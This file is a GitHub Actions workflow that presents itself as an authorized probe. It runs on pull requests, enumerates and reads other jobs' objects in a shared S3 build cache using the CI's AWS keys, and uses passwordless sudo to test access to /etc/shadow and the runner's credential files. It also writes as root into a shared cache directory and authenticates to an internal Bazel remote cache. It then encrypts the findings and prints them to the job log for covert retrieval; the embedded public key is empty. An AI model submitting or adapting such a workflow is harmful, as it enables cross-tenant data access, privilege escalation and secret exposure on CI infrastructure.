name: zz-deep-probe

# Authorized assessment probe (radkawar, owner consent).
# Close out the boundary questions:
#   a) the bucket holds objects from OTHER (trusted) jobs, created before this PR:
#      read them, report size+sha256 only (never bodies);
#   b) passwordless sudo -> what does root see that uid 1001 cannot;
#   c) bazel-remote read/write through the real client, with real output captured.
# Encrypted report.

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  deep:
    name: pre-existing artifact read + root + bazel
    runs-on: omp-kata
    timeout-minutes: 25
    steps:
      - name: deep
        run: |
          set +e
          R=/tmp/report; : > "$R"
          log() { echo "$@" | tee -a "$R"; }
          BASE="http://${SCCACHE_ENDPOINT}"; B="${SCCACHE_BUCKET:-sccache}"
          SIG=(--aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
          log "## run=${GITHUB_RUN_ID} started=$(date -u +%FT%TZ) sha=$(git -C . rev-parse --short HEAD 2>/dev/null)"

          log ""
          log "## a) $B contents: age, count, size, and reads of pre-existing objects"
          : > /tmp/all.xml; tok=""; pages=0
          while :; do
            pages=$((pages+1)); [ $pages -gt 40 ] && break
            q="list-type=2&max-keys=1000"; [ -n "$tok" ] && q="$q&continuation-token=$tok"
            curl -sS --max-time 25 "${SIG[@]}" "$BASE/$B?$q" -o /tmp/p.xml
            cat /tmp/p.xml >> /tmp/all.xml
            tok=$(sed -n 's:.*<NextContinuationToken>\([^<]*\)</NextContinuationToken>.*:\1:p' /tmp/p.xml | head -1)
            [ -z "$tok" ] && break
          done
          if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PY' >> "$R" 2>&1
          import re,collections
          x=open('/tmp/all.xml',encoding='utf-8',errors='replace').read()
          recs=re.findall(r'<Contents>(.*?)</Contents>',x,re.S)
          def g(b,t):
              m=re.search(r'<%s>(.*?)</%s>'%(t,t),b,re.S); return m.group(1) if m else ''
          items=[(g(b,'Key'),g(b,'LastModified'),int(g(b,'Size') or 0)) for b in recs]
          print("     objects=%d bytes=%d pages=%d"%(len(items),sum(i[2] for i in items),len(re.findall(r'<IsTruncated>',x))))
          if items:
              lm=sorted(i[1] for i in items if i[1])
              print("     oldest=%s newest=%s"%(lm[0],lm[-1]) if lm else "     no timestamps")
              print("     by day: %s"%dict(collections.Counter(i[1][:10] for i in items).most_common(6)))
              print("     largest: %s"%sorted(items,key=lambda t:-t[2])[:3])
              print("     sample (10):")
              for k,t,s in items[:10]: print("       %s  %s  %d"%(t,k,s))
              open('/tmp/keys','w').write("\n".join(i[0] for i in items))
          PY
          else
            log "     (python3 absent; using sed)"
            grep -o '<Key>[^<]*</Key>' /tmp/all.xml | sed 's:</*Key>::g' > /tmp/keys
            log "     objects=$(wc -l < /tmp/keys)"
          fi
          log "     --- reading 3 pre-existing objects (size+sha256 only) ---"
          n=0
          while read -r k; do
            [ -z "$k" ] && continue
            n=$((n+1)); [ $n -gt 3 ] && break
            code=$(curl -sS -o /tmp/o -w '%{http_code}' --max-time 30 "${SIG[@]}" "$BASE/$B/$k")
            log "     GET $k -> HTTP $code bytes=$(wc -c </tmp/o) sha256=$(sha256sum /tmp/o | cut -d' ' -f1) head=$(head -c 16 /tmp/o | od -An -tx1 | tr -d ' \n')"
          done < /tmp/keys

          log ""
          log "## b) root via passwordless sudo"
          log "     id: $(id -u)"
          log "     sudo -n id: $(sudo -n id 2>&1 | head -1)"
          log "     root-only paths now readable:"
          for p in /etc/shadow /home/runner/.actions-runner/.runner /home/runner/.actions-runner/.credentials_rsaparams; do
            log "       $p readable=$([ -n "$(sudo -n ls -la "$p" 2>/dev/null)" ] && echo yes || echo no)"
          done
          log "     root-owned under shared cache: $(sudo -n find /opt/bazel-repo-cache -maxdepth 1 ! -user runner 2>/dev/null | head -5 | tr '\n' ' ')"
          log "     runner dir: $(sudo -n ls -la /home/runner/.actions-runner 2>/dev/null | head -6 | tr '\n' '|')"
          log "     can write as root to root-owned dir: $(sudo -n sh -c 't=/opt/bazel-repo-cache/.radkawar-root-probe; echo x > $t 2>/dev/null && rm -f $t && echo yes || echo no')"

          log ""
          log "## c) bazel-remote via the real client"
          BW=/tmp/bw; rm -rf "$BW"; mkdir -p "$BW"
          printf 'genrule(name="x", outs=["o.txt"], cmd="echo %s > $@")\n' "$GITHUB_RUN_ID" > "$BW/BUILD.bazel"
          printf 'module(name="probe")\n' > "$BW/MODULE.bazel"
          AUTH=$(printf '%s:%s' "$BAZEL_REMOTE_USER" "$BAZEL_REMOTE_PASSWORD" | base64 -w0)
          RC="grpcs://bazel-remote.bazel-cache.svc.cluster.local:9092"
          cd "$BW"
          for i in 1 2 3; do
            tag=write; [ $i -eq 3 ] && tag=read
            ( timeout 420 bazel --output_base=/tmp/bo-$i build //:x \
                --remote_cache="$RC" --remote_header="authorization=Basic $AUTH" \
                --remote_upload_local_results=true --remote_timeout=60 \
                --remote_download_outputs=all ) > /tmp/bz-$i.log 2>&1
            rc=$?
            log "     attempt $i ($tag) exit=$rc"
            grep -oiE "(remote cache hit|uploading|1 process|WARNING: Remote Cache|UNAUTHENTICATED|PERMISSION_DENIED|NOT_FOUND|ERROR: [^\n]{0,120})" /tmp/bz-$i.log | sort | uniq -c | head -8 | sed 's/^/       /'
            tail -3 /tmp/bz-$i.log | sed 's/^/       | /'
          done

          printf '%s' '' | base64 -d > /tmp/pub.der
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16); printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in "$R" -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der \
            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
            -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-BLOB=$(base64 -w0 /tmp/ct)"
          echo "PROBE-PLAINTEXT-SHA256=$(sha256sum "$R" | cut -d' ' -f1)"
          exit 0
